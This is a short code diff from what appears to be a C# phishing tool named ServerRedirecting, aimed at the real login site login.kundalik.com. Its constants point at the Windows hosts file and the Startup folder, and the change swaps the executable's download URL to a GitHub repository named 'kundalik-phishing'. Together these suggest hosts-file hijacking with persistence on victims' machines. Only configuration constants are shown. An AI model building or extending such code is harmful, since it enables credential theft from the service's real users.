@@ -9,7 +9,7 @@ namespace ServerRedirecting
     {
         const string Phishing = "127.0.0.1";
         const string Target = "login.kundalik.com";
-        const string URL = "http://login-kundalik.ezyro.com/program/ServerRedirecting.exe";
+        const string URL = "https://github.com/Ulu-pro/kundalik-phishing/raw/main/program/ServerRedirecting.exe";
         const string StartUp = @"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\";
         const string Hosts = @"C:\Windows\System32\drivers\etc\hosts";
         const string Server = @"ServerRedirecting.exe";
